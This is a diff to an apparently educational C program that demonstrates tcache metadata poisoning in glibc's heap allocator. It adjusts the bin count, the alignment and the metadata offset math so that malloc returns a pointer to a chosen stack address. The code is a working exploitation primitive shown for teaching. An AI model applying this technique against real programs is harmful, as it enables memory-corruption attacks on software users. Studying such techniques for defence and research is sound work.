@@ -11,7 +11,7 @@
 // allocating a chunk of the appropriate size.
 
 // By default there are 64 tcache bins
-#define TCACHE_BINS 64
+#define TCACHE_BINS 76
 // The header of a heap chunk is 0x10 bytes in size
 #define HEADER_SIZE 0x10
 
@@ -26,7 +26,7 @@ int main() {
   setbuf(stdin, NULL);
   setbuf(stdout, NULL);
 
-  uint64_t stack_target = 0x1337;
+  uint64_t stack_target __attribute__ ((aligned (0x10))) = 0x1337;
 
   puts("This example demonstrates what an attacker can achieve by controlling\n"
        "the metadata chunk of the tcache.\n");
@@ -37,18 +37,19 @@ int main() {
   printf("Victim chunk is at: %p.\n\n", victim);
 
   long metadata_size = sizeof(struct tcache_metadata);
+  long rounded_metadata_size = metadata_size & ~(HEADER_SIZE-1); // round it down
   printf("Next we have to calculate the base address of the metadata struct.\n"
          "The metadata struct itself is %#lx bytes in size. Additionally we\n"
          "have to subtract the header of the victim chunk (so an extra 0x10\n"
          "bytes).\n",
          sizeof(struct tcache_metadata));
   struct tcache_metadata *metadata =
-      (struct tcache_metadata *)((long)victim - HEADER_SIZE - metadata_size);
+      (struct tcache_metadata *)((long)victim - rounded_metadata_size - HEADER_SIZE);
   printf("The tcache metadata is located at %p.\n\n", metadata);
 
   puts("Now we manipulate the metadata struct and insert the target address\n"
        "in a chunk. Here we choose the second tcache bin.\n");
-  metadata->counts[1] = 1;
+  metadata->counts[1] = 6;
   metadata->entries[1] = &stack_target;
 
   uint64_t *evil = malloc(0x20);
